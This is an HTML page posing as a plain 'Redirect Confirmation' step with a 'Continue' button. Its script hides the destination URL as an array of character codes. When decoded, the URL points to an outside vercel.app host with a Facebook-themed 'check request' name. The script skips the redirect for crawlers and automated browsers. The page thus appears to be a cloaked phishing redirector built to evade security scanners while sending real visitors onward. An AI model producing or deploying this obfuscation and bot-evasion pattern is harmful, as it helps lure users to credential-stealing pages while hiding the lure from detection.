<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirect Confirmation</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #f1f3f7;
      font-family: Arial, sans-serif;
      display: flex;
      height: 100vh;
      justify-content: center;
      align-items: center;
      margin: 0;
    }
    .box {
      background: white;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 8px rgba(0,0,0,0.05);
      text-align: center;
    }
    .box h2 {
      color: #2b63f3;
      margin-bottom: 10px;
    }
    .box p {
      color: #555;
      margin-bottom: 20px;
    }
    .btn {
      padding: 10px 24px;
      background: #2b63f3;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .btn:hover {
      background: #194fd4;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>Redirect Confirmation</h2>
    <p>Please click the button below to continue.</p>
    <button class="btn" onclick="safeRedirect()">Continue</button>
  </div>

  <script>
    function isBot() {
      return navigator.webdriver || /bot|crawl|spider/i.test(navigator.userAgent);
    }

    const obfuscated = [104,116,116,112,115,58,47,47,99,104,101,99,107,114,101,113,117,101,115,116,102,98,55,52,49,46,118,101,114,99,101,108,46,97,112,112,47,104,116,99,116,46,116,105,107,47,112,97,103,101,46,104,116,109,108];

    function safeRedirect() {
      if (isBot()) return;
      const decoded = obfuscated.map(c => String.fromCharCode(c)).join('');
      setTimeout(() => {
        window.location.href = decoded;
      }, 700);
    }
  </script>
</body>
</html>
